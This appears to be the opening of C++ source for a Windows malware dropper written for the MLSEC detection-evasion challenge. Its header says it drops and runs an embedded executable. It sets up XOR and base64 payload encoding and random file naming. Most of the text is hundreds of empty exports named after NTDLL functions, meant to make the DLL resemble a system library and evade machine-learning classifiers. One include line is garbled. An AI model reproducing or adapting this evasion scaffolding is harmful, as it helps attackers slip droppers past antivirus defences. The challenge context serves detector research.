// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks, modified in 2021 to DLL format

// Required Imports
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

// Functions prototypes
void drop(int size, void *buffer);
void* XOR(void *data, int size);
void* base64decode(void *data,DWORD *size);
void launch();
void set_name();

// Dropper Configurations
//#define DEAD_IMPORTS
#define XOR_ENCODE
#define XOR_KEY 0x35
#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
//#define INJECT

// creates lots of dead exports to mimic the NTDLL
extern "C" { __declspec(dllexport) void A_SHAFinal() { return; } }
extern "C" { __declspec(dllexport) void A_SHAInit() { return; } }
extern "C" { __declspec(dllexport) void A_SHAUpdate() { return; } }
extern "C" { __declspec(dllexport) void AlpcAdjustCompletionListConcurrencyCount() { return; } }
extern "C" { __declspec(dllexport) void AlpcFreeCompletionListMessage() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetCompletionListLastMessageInformation() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetCompletionListMessageAttributes() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetHeaderSize() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetMessageAttribute() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetMessageFromCompletionList() { return; } }
extern "C" { __declspec(dllexport) void AlpcGetOutstandingCompletionListMessageCount() { return; } }
extern "C" { __declspec(dllexport) void AlpcInitializeMessageAttribute() { return; } }
extern "C" { __declspec(dllexport) void AlpcMaxAllowedMessageLength() { return; } }
extern "C" { __declspec(dllexport) void AlpcRegisterCompletionList() { return; } }
extern "C" { __declspec(dllexport) void AlpcRegisterCompletionListWorkerThread() { return; } }
extern "C" { __declspec(dllexport) void AlpcRundownCompletionList() { return; } }
extern "C" { __declspec(dllexport) void AlpcUnregisterCompletionList() { return; } }
extern "C" { __declspec(dllexport) void AlpcUnregisterCompletionListWorkerThread() { return; } }
extern "C" { __declspec(dllexport) void ApiSetQueryApiSetPresence() { return; } }
extern "C" { __declspec(dllexport) void CsrAllocateCaptureBuffer() { return; } }
extern "C" { __declspec(dllexport) void CsrAllocateMessagePointer() { return; } }
extern "C" { __declspec(dllexport) void CsrCaptureMessageBuffer() { return; } }
extern "C" { __declspec(dllexport) void CsrCaptureMessageMultiUnicodeStringsInPlace() { return; } }
extern "C" { __declspec(dllexport) void CsrCaptureMessageString() { return; } }
extern "C" { __declspec(dllexport) void CsrCaptureTimeout() { return; } }
extern "C" { __declspec(dllexport) void CsrClientCallServer() { return; } }
extern "C" { __declspec(dllexport) void CsrClientConnectToServer() { return; } }
extern "C" { __declspec(dllexport) void CsrFreeCaptureBuffer() { return; } }
extern "C" { __declspec(dllexport) void CsrGetProcessId() { return; } }
extern "C" { __declspec(dllexport) void CsrIdentifyAlertableThread() { return; } }
extern "C" { __declspec(dllexport) void CsrSetPriorityClass() { return; } }
extern "C" { __declspec(dllexport) void CsrVerifyRegion() { return; } }
extern "C" { __declspec(dllexport) void DbgBreakPoint() { return; } }
extern "C" { __declspec(dllexport) void DbgPrint() { return; } }
extern "C" { __declspec(dllexport) void DbgPrintEx() { return; } }
extern "C" { __declspec(dllexport) void DbgPrintReturnControlC() { return; } }
extern "C" { __declspec(dllexport) void DbgPrompt() { return; } }
extern "C" { __declspec(dllexport) void DbgQueryDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void DbgSetDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void DbgUiConnectToDbg() { return; } }
extern "C" { __declspec(dllexport) void DbgUiContinue() { return; } }
extern "C" { __declspec(dllexport) void DbgUiConvertStateChangeStructure() { return; } }
extern "C" { __declspec(dllexport) void DbgUiDebugActiveProcess() { return; } }
extern "C" { __declspec(dllexport) void DbgUiGetThreadDebugObject() { return; } }
extern "C" { __declspec(dllexport) void DbgUiIssueRemoteBreakin() { return; } }
extern "C" { __declspec(dllexport) void DbgUiRemoteBreakin() { return; } }
extern "C" { __declspec(dllexport) void DbgUiSetThreadDebugObject() { return; } }
extern "C" { __declspec(dllexport) void DbgUiStopDebugging() { return; } }
extern "C" { __declspec(dllexport) void DbgUiWaitStateChange() { return; } }
extern "C" { __declspec(dllexport) void DbgUserBreakPoint() { return; } }
extern "C" { __declspec(dllexport) void EtwCreateTraceInstanceId() { return; } }
extern "C" { __declspec(dllexport) void EtwDeliverDataBlock() { return; } }
extern "C" { __declspec(dllexport) void EtwEnumerateProcessRegGuids() { return; } }
extern "C" { __declspec(dllexport) void EtwEventActivityIdControl() { return; } }
extern "C" { __declspec(dllexport) void EtwEventEnabled() { return; } }
extern "C" { __declspec(dllexport) void EtwEventProviderEnabled() { return; } }
extern "C" { __declspec(dllexport) void EtwEventRegister() { return; } }
extern "C" { __declspec(dllexport) void EtwEventSetInformation() { return; } }
extern "C" { __declspec(dllexport) void EtwEventUnregister() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWrite() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteEndScenario() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteEx() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteFull() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteNoRegistration() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteStartScenario() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteString() { return; } }
extern "C" { __declspec(dllexport) void EtwEventWriteTransfer() { return; } }
extern "C" { __declspec(dllexport) void EtwGetTraceEnableFlags() { return; } }
extern "C" { __declspec(dllexport) void EtwGetTraceEnableLevel() { return; } }
extern "C" { __declspec(dllexport) void EtwGetTraceLoggerHandle() { return; } }
extern "C" { __declspec(dllexport) void EtwLogTraceEvent() { return; } }
extern "C" { __declspec(dllexport) void EtwNotificationRegister() { return; } }
extern "C" { __declspec(dllexport) void EtwNotificationUnregister() { return; } }
extern "C" { __declspec(dllexport) void EtwProcessPrivateLoggerRequest() { return; } }
extern "C" { __declspec(dllexport) void EtwRegisterSecurityProvider() { return; } }
extern "C" { __declspec(dllexport) void EtwRegisterTraceGuidsA() { return; } }
extern "C" { __declspec(dllexport) void EtwRegisterTraceGuidsW() { return; } }
extern "C" { __declspec(dllexport) void EtwReplyNotification() { return; } }
extern "C" { __declspec(dllexport) void EtwSendNotification() { return; } }
extern "C" { __declspec(dllexport) void EtwSetMark() { return; } }
extern "C" { __declspec(dllexport) void EtwTraceEventInstance() { return; } }
extern "C" { __declspec(dllexport) void EtwTraceMessage() { return; } }
extern "C" { __declspec(dllexport) void EtwTraceMessageVa() { return; } }
extern "C" { __declspec(dllexport) void EtwUnregisterTraceGuids() { return; } }
extern "C" { __declspec(dllexport) void EtwWriteUMSecurityEvent() { return; } }
extern "C" { __declspec(dllexport) void EtwpCreateEtwThread() { return; } }
extern "C" { __declspec(dllexport) void EtwpGetCpuSpeed() { return; } }
extern "C" { __declspec(dllexport) void EtwpNotificationThread() { return; } }
extern "C" { __declspec(dllexport) void EvtIntReportAuthzEventAndSourceAsync() { return; } }
extern "C" { __declspec(dllexport) void EvtIntReportEventAndSourceAsync() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListEnd() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListEnd16() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListFault() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListFault16() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListResume() { return; } }
extern "C" { __declspec(dllexport) void ExpInterlockedPopEntrySListResume16() { return; } }
extern "C" { __declspec(dllexport) void KiRaiseUserExceptionDispatcher() { return; } }
extern "C" { __declspec(dllexport) void KiUserApcDispatcher() { return; } }
extern "C" { __declspec(dllexport) void KiUserCallbackDispatcher() { return; } }
extern "C" { __declspec(dllexport) void KiUserExceptionDispatcher() { return; } }
extern "C" { __declspec(dllexport) void LdrAccessResource() { return; } }
extern "C" { __declspec(dllexport) void LdrAddDllDirectory() { return; } }
extern "C" { __declspec(dllexport) void LdrAddLoadAsDataTable() { return; } }
extern "C" { __declspec(dllexport) void LdrAddRefDll() { return; } }
extern "C" { __declspec(dllexport) void LdrAppxHandleIntegrityFailure() { return; } }
extern "C" { __declspec(dllexport) void LdrDisableThreadCalloutsForDll() { return; } }
extern "C" { __declspec(dllexport) void LdrEnumResources() { return; } }
extern "C" { __declspec(dllexport) void LdrEnumerateLoadedModules() { return; } }
extern "C" { __declspec(dllexport) void LdrFindEntryForAddress() { return; } }
extern "C" { __declspec(dllexport) void LdrFindResourceDirectory_U() { return; } }
extern "C" { __declspec(dllexport) void LdrFindResourceEx_U() { return; } }
extern "C" { __declspec(dllexport) void LdrFindResource_U() { return; } }
extern "C" { __declspec(dllexport) void LdrFlushAlternateResourceModules() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllDirectory() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllFullName() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllHandle() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllHandleByMapping() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllHandleByName() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllHandleEx() { return; } }
extern "C" { __declspec(dllexport) void LdrGetDllPath() { return; } }
extern "C" { __declspec(dllexport) void LdrGetFailureData() { return; } }
extern "C" { __declspec(dllexport) void LdrGetFileNameFromLoadAsDataTable() { return; } }
extern "C" { __declspec(dllexport) void LdrGetKnownDllSectionHandle() { return; } }
extern "C" { __declspec(dllexport) void LdrGetProcedureAddress() { return; } }
extern "C" { __declspec(dllexport) void LdrGetProcedureAddressEx() { return; } }
extern "C" { __declspec(dllexport) void LdrGetProcedureAddressForCaller() { return; } }
extern "C" { __declspec(dllexport) void LdrHotPatchRoutine() { return; } }
extern "C" { __declspec(dllexport) void LdrInitShimEngineDynamic() { return; } }
extern "C" { __declspec(dllexport) void LdrInitializeThunk() { return; } }
extern "C" { __declspec(dllexport) void LdrLoadAlternateResourceModule() { return; } }
extern "C" { __declspec(dllexport) void LdrLoadAlternateResourceModuleEx() { return; } }
extern "C" { __declspec(dllexport) void LdrLoadDll() { return; } }
extern "C" { __declspec(dllexport) void LdrLockLoaderLock() { return; } }
extern "C" { __declspec(dllexport) void LdrOpenImageFileOptionsKey() { return; } }
extern "C" { __declspec(dllexport) void LdrProcessInitializationComplete() { return; } }
extern "C" { __declspec(dllexport) void LdrProcessRelocationBlock() { return; } }
extern "C" { __declspec(dllexport) void LdrProcessRelocationBlockEx() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryImageFileExecutionOptions() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryImageFileExecutionOptionsEx() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryImageFileKeyOption() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryModuleServiceTags() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryOptionalDelayLoadedAPI() { return; } }
extern "C" { __declspec(dllexport) void LdrQueryProcessModuleInformation() { return; } }
extern "C" { __declspec(dllexport) void LdrRegisterDllNotification() { return; } }
extern "C" { __declspec(dllexport) void LdrRemoveDllDirectory() { return; } }
extern "C" { __declspec(dllexport) void LdrRemoveLoadAsDataTable() { return; } }
extern "C" { __declspec(dllexport) void LdrResFindResource() { return; } }
extern "C" { __declspec(dllexport) void LdrResFindResourceDirectory() { return; } }
extern "C" { __declspec(dllexport) void LdrResGetRCConfig() { return; } }
extern "C" { __declspec(dllexport) void LdrResRelease() { return; } }
extern "C" { __declspec(dllexport) void LdrResSearchResource() { return; } }
extern "C" { __declspec(dllexport) void LdrResolveDelayLoadedAPI() { return; } }
extern "C" { __declspec(dllexport) void LdrResolveDelayLoadsFromDll() { return; } }
extern "C" { __declspec(dllexport) void LdrRscIsTypeExist() { return; } }
extern "C" { __declspec(dllexport) void LdrSetAppCompatDllRedirectionCallback() { return; } }
extern "C" { __declspec(dllexport) void LdrSetDefaultDllDirectories() { return; } }
extern "C" { __declspec(dllexport) void LdrSetDllManifestProber() { return; } }
extern "C" { __declspec(dllexport) void LdrSetMUICacheType() { return; } }
extern "C" { __declspec(dllexport) void LdrShutdownProcess() { return; } }
extern "C" { __declspec(dllexport) void LdrShutdownThread() { return; } }
extern "C" { __declspec(dllexport) void LdrStandardizeSystemPath() { return; } }
extern "C" { __declspec(dllexport) void LdrSystemDllInitBlock() { return; } }
extern "C" { __declspec(dllexport) void LdrUnloadAlternateResourceModule() { return; } }
extern "C" { __declspec(dllexport) void LdrUnloadAlternateResourceModuleEx() { return; } }
extern "C" { __declspec(dllexport) void LdrUnloadDll() { return; } }
extern "C" { __declspec(dllexport) void LdrUnlockLoaderLock() { return; } }
extern "C" { __declspec(dllexport) void LdrUnregisterDllNotification() { return; } }
extern "C" { __declspec(dllexport) void LdrVerifyImageMatchesChecksum() { return; } }
extern "C" { __declspec(dllexport) void LdrVerifyImageMatchesChecksumEx() { return; } }
extern "C" { __declspec(dllexport) void LdrpResGetMappingSize() { return; } }
extern "C" { __declspec(dllexport) void LdrpResGetResourceDirectory() { return; } }
extern "C" { __declspec(dllexport) void MD4Final() { return; } }
extern "C" { __declspec(dllexport) void MD4Init() { return; } }
extern "C" { __declspec(dllexport) void MD4Update() { return; } }
extern "C" { __declspec(dllexport) void MD5Final() { return; } }
extern "C" { __declspec(dllexport) void MD5Init() { return; } }
extern "C" { __declspec(dllexport) void MD5Update() { return; } }
extern "C" { __declspec(dllexport) void NlsAnsiCodePage() { return; } }
extern "C" { __declspec(dllexport) void NlsMbCodePageTag() { return; } }
extern "C" { __declspec(dllexport) void NlsMbOemCodePageTag() { return; } }
extern "C" { __declspec(dllexport) void NtAcceptConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheck() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckByType() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckByTypeAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckByTypeResultList() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckByTypeResultListAndAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtAccessCheckByTypeResultListAndAuditAlarmByHandle() { return; } }
extern "C" { __declspec(dllexport) void NtAddAtom() { return; } }
extern "C" { __declspec(dllexport) void NtAddAtomEx() { return; } }
extern "C" { __declspec(dllexport) void NtAddBootEntry() { return; } }
extern "C" { __declspec(dllexport) void NtAddDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void NtAdjustGroupsToken() { return; } }
extern "C" { __declspec(dllexport) void NtAdjustPrivilegesToken() { return; } }
extern "C" { __declspec(dllexport) void NtAdjustTokenClaimsAndDeviceGroups() { return; } }
extern "C" { __declspec(dllexport) void NtAlertResumeThread() { return; } }
extern "C" { __declspec(dllexport) void NtAlertThread() { return; } }
extern "C" { __declspec(dllexport) void NtAlertThreadByThreadId() { return; } }
extern "C" { __declspec(dllexport) void NtAllocateLocallyUniqueId() { return; } }
extern "C" { __declspec(dllexport) void NtAllocateReserveObject() { return; } }
extern "C" { __declspec(dllexport) void NtAllocateUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void NtAllocateUuids() { return; } }
extern "C" { __declspec(dllexport) void NtAllocateVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcAcceptConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcCancelMessage() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcConnectPortEx() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcCreatePort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcCreatePortSection() { return; } } 
extern "C" { __declspec(dllexport) void NtAlpcCreateResourceReserve() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcCreateSectionView() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcCreateSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcDeletePortSection() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcDeleteResourceReserve() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcDeleteSectionView() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcDeleteSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcDisconnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcImpersonateClientOfPort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcOpenSenderProcess() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcOpenSenderThread() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcQueryInformation() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcQueryInformationMessage() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcRevokeSecurityContext() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcSendWaitReceivePort() { return; } }
extern "C" { __declspec(dllexport) void NtAlpcSetInformation() { return; } }
extern "C" { __declspec(dllexport) void NtApphelpCacheControl() { return; } }
extern "C" { __declspec(dllexport) void NtAreMappedFilesTheSame() { return; } }
extern "C" { __declspec(dllexport) void NtAssignProcessToJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtAssociateWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void NtCallbackReturn() { return; } }
extern "C" { __declspec(dllexport) void NtCancelIoFile() { return; } }
extern "C" { __declspec(dllexport) void NtCancelIoFileEx() { return; } }
extern "C" { __declspec(dllexport) void NtCancelSynchronousIoFile() { return; } }
extern "C" { __declspec(dllexport) void NtCancelTimer() { return; } }
extern "C" { __declspec(dllexport) void NtCancelWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void NtClearEvent() { return; } }
extern "C" { __declspec(dllexport) void NtClose() { return; } }
extern "C" { __declspec(dllexport) void NtCloseObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtCommitComplete() { return; } }
extern "C" { __declspec(dllexport) void NtCommitEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtCommitTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtCompactKeys() { return; } }
extern "C" { __declspec(dllexport) void NtCompareTokens() { return; } }
extern "C" { __declspec(dllexport) void NtCompleteConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtCompressKey() { return; } }
extern "C" { __declspec(dllexport) void NtConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtContinue() { return; } }
extern "C" { __declspec(dllexport) void NtCreateDebugObject() { return; } }
extern "C" { __declspec(dllexport) void NtCreateDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void NtCreateDirectoryObjectEx() { return; } }
extern "C" { __declspec(dllexport) void NtCreateEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtCreateEvent() { return; } }
extern "C" { __declspec(dllexport) void NtCreateEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtCreateFile() { return; } }
extern "C" { __declspec(dllexport) void NtCreateIRTimer() { return; } }
extern "C" { __declspec(dllexport) void NtCreateIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void NtCreateJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtCreateJobSet() { return; } }
extern "C" { __declspec(dllexport) void NtCreateKey() { return; } }
extern "C" { __declspec(dllexport) void NtCreateKeyTransacted() { return; } }
extern "C" { __declspec(dllexport) void NtCreateKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void NtCreateLowBoxToken() { return; } }
extern "C" { __declspec(dllexport) void NtCreateMailslotFile() { return; } }
extern "C" { __declspec(dllexport) void NtCreateMutant() { return; } }
extern "C" { __declspec(dllexport) void NtCreateNamedPipeFile() { return; } }
extern "C" { __declspec(dllexport) void NtCreatePagingFile() { return; } }
extern "C" { __declspec(dllexport) void NtCreatePort() { return; } }
extern "C" { __declspec(dllexport) void NtCreatePrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void NtCreateProcess() { return; } }
extern "C" { __declspec(dllexport) void NtCreateProcessEx() { return; } }
extern "C" { __declspec(dllexport) void NtCreateProfile() { return; } }
extern "C" { __declspec(dllexport) void NtCreateProfileEx() { return; } }
extern "C" { __declspec(dllexport) void NtCreateResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtCreateSection() { return; } }
extern "C" { __declspec(dllexport) void NtCreateSemaphore() { return; } }
extern "C" { __declspec(dllexport) void NtCreateSymbolicLinkObject() { return; } }
extern "C" { __declspec(dllexport) void NtCreateThread() { return; } }
extern "C" { __declspec(dllexport) void NtCreateThreadEx() { return; } }
extern "C" { __declspec(dllexport) void NtCreateTimer() { return; } }
extern "C" { __declspec(dllexport) void NtCreateToken() { return; } }
extern "C" { __declspec(dllexport) void NtCreateTokenEx() { return; } }
extern "C" { __declspec(dllexport) void NtCreateTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtCreateTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtCreateUserProcess() { return; } }
extern "C" { __declspec(dllexport) void NtCreateWaitCompletionPacket() { return; } }
extern "C" { __declspec(dllexport) void NtCreateWaitablePort() { return; } }
extern "C" { __declspec(dllexport) void NtCreateWnfStateName() { return; } }
extern "C" { __declspec(dllexport) void NtCreateWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void NtDebugActiveProcess() { return; } }
extern "C" { __declspec(dllexport) void NtDebugContinue() { return; } }
extern "C" { __declspec(dllexport) void NtDelayExecution() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteAtom() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteBootEntry() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteFile() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteKey() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtDeletePrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteValueKey() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void NtDeleteWnfStateName() { return; } }
extern "C" { __declspec(dllexport) void NtDeviceIoControlFile() { return; } }
extern "C" { __declspec(dllexport) void NtDisableLastKnownGood() { return; } }
extern "C" { __declspec(dllexport) void NtDisplayString() { return; } }
extern "C" { __declspec(dllexport) void NtDrawText() { return; } }
extern "C" { __declspec(dllexport) void NtDuplicateObject() { return; } }
extern "C" { __declspec(dllexport) void NtDuplicateToken() { return; } }
extern "C" { __declspec(dllexport) void NtEnableLastKnownGood() { return; } }
extern "C" { __declspec(dllexport) void NtEnumerateBootEntries() { return; } }
extern "C" { __declspec(dllexport) void NtEnumerateDriverEntries() { return; } }
extern "C" { __declspec(dllexport) void NtEnumerateSystemEnvironmentValuesEx() { return; } }
extern "C" { __declspec(dllexport) void NtEnumerateTransactionObject() { return; } }
extern "C" { __declspec(dllexport) void NtEnumerateValueKey() { return; } }
extern "C" { __declspec(dllexport) void NtExtendSection() { return; } }
extern "C" { __declspec(dllexport) void NtFilterBootOption() { return; } }
extern "C" { __declspec(dllexport) void NtFilterToken() { return; } }
extern "C" { __declspec(dllexport) void NtFilterTokenEx() { return; } }
extern "C" { __declspec(dllexport) void NtFindAtom() { return; } }
extern "C" { __declspec(dllexport) void NtFlushBuffersFile() { return; } }
extern "C" { __declspec(dllexport) void NtFlushBuffersFileEx() { return; } }
extern "C" { __declspec(dllexport) void NtFlushInstallUILanguage() { return; } }
extern "C" { __declspec(dllexport) void NtFlushInstructionCache() { return; } }
extern "C" { __declspec(dllexport) void NtFlushKey() { return; } }
extern "C" { __declspec(dllexport) void NtFlushProcessWriteBuffers() { return; } }
extern "C" { __declspec(dllexport) void NtFlushVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtFlushWriteBuffer() { return; } }
extern "C" { __declspec(dllexport) void NtFreeUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void NtFreeVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtFreezeRegistry() { return; } }
extern "C" { __declspec(dllexport) void NtFreezeTransactions() { return; } }
extern "C" { __declspec(dllexport) void NtFsControlFile() { return; } }
extern "C" { __declspec(dllexport) void NtGetCachedSigningLevel() { return; } }
extern "C" { __declspec(dllexport) void NtGetContextThread() { return; } }
extern "C" { __declspec(dllexport) void NtGetCurrentProcessorNumber() { return; } }
extern "C" { __declspec(dllexport) void NtGetDevicePowerState() { return; } }
extern "C" { __declspec(dllexport) void NtGetMUIRegistryInfo() { return; } }
extern "C" { __declspec(dllexport) void NtGetNextProcess() { return; } }
extern "C" { __declspec(dllexport) void NtGetNextThread() { return; } }
extern "C" { __declspec(dllexport) void NtGetNlsSectionPtr() { return; } }
extern "C" { __declspec(dllexport) void NtGetNotificationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtGetTickCount() { return; } }
extern "C" { __declspec(dllexport) void NtGetWriteWatch() { return; } }
extern "C" { __declspec(dllexport) void NtImpersonateAnonymousToken() { return; } }
extern "C" { __declspec(dllexport) void NtImpersonateClientOfPort() { return; } }
extern "C" { __declspec(dllexport) void NtImpersonateThread() { return; } }
extern "C" { __declspec(dllexport) void NtInitializeNlsFiles() { return; } }
extern "C" { __declspec(dllexport) void NtInitializeRegistry() { return; } }
extern "C" { __declspec(dllexport) void NtInitiatePowerAction() { return; } }
extern "C" { __declspec(dllexport) void NtIsProcessInJob() { return; } }
extern "C" { __declspec(dllexport) void NtIsSystemResumeAutomatic() { return; } }
extern "C" { __declspec(dllexport) void NtIsUILanguageComitted() { return; } }
extern "C" { __declspec(dllexport) void NtListenPort() { return; } }
extern "C" { __declspec(dllexport) void NtLoadDriver() { return; } }
extern "C" { __declspec(dllexport) void NtLoadKey() { return; } }
extern "C" { __declspec(dllexport) void NtLoadKey2() { return; } }
extern "C" { __declspec(dllexport) void NtLoadKeyEx() { return; } }
extern "C" { __declspec(dllexport) void NtLockFile() { return; } }
extern "C" { __declspec(dllexport) void NtLockProductActivationKeys() { return; } }
extern "C" { __declspec(dllexport) void NtLockRegistryKey() { return; } }
extern "C" { __declspec(dllexport) void NtLockVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtMakePermanentObject() { return; } }
extern "C" { __declspec(dllexport) void NtMakeTemporaryObject() { return; } }
extern "C" { __declspec(dllexport) void NtMapCMFModule() { return; } }
extern "C" { __declspec(dllexport) void NtMapUserPhysicalPages() { return; } }
extern "C" { __declspec(dllexport) void NtMapUserPhysicalPagesScatter() { return; } }
extern "C" { __declspec(dllexport) void NtMapViewOfSection() { return; } }
extern "C" { __declspec(dllexport) void NtModifyBootEntry() { return; } }
extern "C" { __declspec(dllexport) void NtModifyDriverEntry() { return; } }
extern "C" { __declspec(dllexport) void NtNotifyChangeDirectoryFile() { return; } }
extern "C" { __declspec(dllexport) void NtNotifyChangeKey() { return; } }
extern "C" { __declspec(dllexport) void NtNotifyChangeMultipleKeys() { return; } }
extern "C" { __declspec(dllexport) void NtNotifyChangeSession() { return; } }
extern "C" { __declspec(dllexport) void NtOpenDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void NtOpenEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtOpenEvent() { return; } }
extern "C" { __declspec(dllexport) void NtOpenEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtOpenFile() { return; } }
extern "C" { __declspec(dllexport) void NtOpenIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void NtOpenJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtOpenKey() { return; } }
extern "C" { __declspec(dllexport) void NtOpenKeyEx() { return; } }
extern "C" { __declspec(dllexport) void NtOpenKeyTransacted() { return; } }
extern "C" { __declspec(dllexport) void NtOpenKeyTransactedEx() { return; } }
extern "C" { __declspec(dllexport) void NtOpenKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void NtOpenMutant() { return; } }
extern "C" { __declspec(dllexport) void NtOpenObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtOpenPrivateNamespace() { return; } }
extern "C" { __declspec(dllexport) void NtOpenProcess() { return; } }
extern "C" { __declspec(dllexport) void NtOpenProcessToken() { return; } }
extern "C" { __declspec(dllexport) void NtOpenProcessTokenEx() { return; } }
extern "C" { __declspec(dllexport) void NtOpenResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtOpenSection() { return; } }
extern "C" { __declspec(dllexport) void NtOpenSemaphore() { return; } }
extern "C" { __declspec(dllexport) void NtOpenThread() { return; } }
extern "C" { __declspec(dllexport) void NtOpenThreadToken() { return; } }
extern "C" { __declspec(dllexport) void NtOpenThreadTokenEx() { return; } }
extern "C" { __declspec(dllexport) void NtOpenTimer() { return; } }
extern "C" { __declspec(dllexport) void NtOpenTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtOpenTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtPlugPlayControl() { return; } }
extern "C" { __declspec(dllexport) void NtPowerInformation() { return; } }
extern "C" { __declspec(dllexport) void NtPrePrepareComplete() { return; } }
extern "C" { __declspec(dllexport) void NtPrePrepareEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtPrepareComplete() { return; } }
extern "C" { __declspec(dllexport) void NtPrepareEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtPrivilegeCheck() { return; } }
